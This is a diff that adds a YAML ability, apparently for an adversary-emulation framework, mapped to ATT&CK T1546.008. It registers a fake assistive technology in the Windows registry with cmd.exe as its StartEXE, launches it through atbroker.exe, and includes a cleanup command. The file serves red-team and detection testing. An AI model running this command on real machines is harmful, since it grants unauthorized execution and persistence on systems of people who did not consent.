@@ -1,0 +1,21 @@
+---
+- id: 91a0baba02f24b848c280ae71653678a
+  name: Atbroker.exe (AT) Executes Arbitrary Command via Registry Key
+  description: 'Executes code specified in the registry for a new AT (Assistive Technologies).
+
+    '
+  tactic: multiple
+  technique:
+    attack_id: T1546.008
+    name: 'Event Triggered Execution: Accessibility Features'
+  platforms:
+    windows:
+      cmd:
+        command: reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test"
+          /f && reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test"
+          /v TerminateOnDesktopSwitch /t REG_DWORD /d 0 /f && reg add "HKLM\Software\Microsoft\Windows
+          NT\CurrentVersion\Accessibility\ATs\malware_test" /v StartEXE /t REG_SZ
+          /d C:\WINDOWS\system32\cmd.exe /f && atbroker /start malware_test
+        payloads: []
+        cleanup: reg delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test"
+          /f
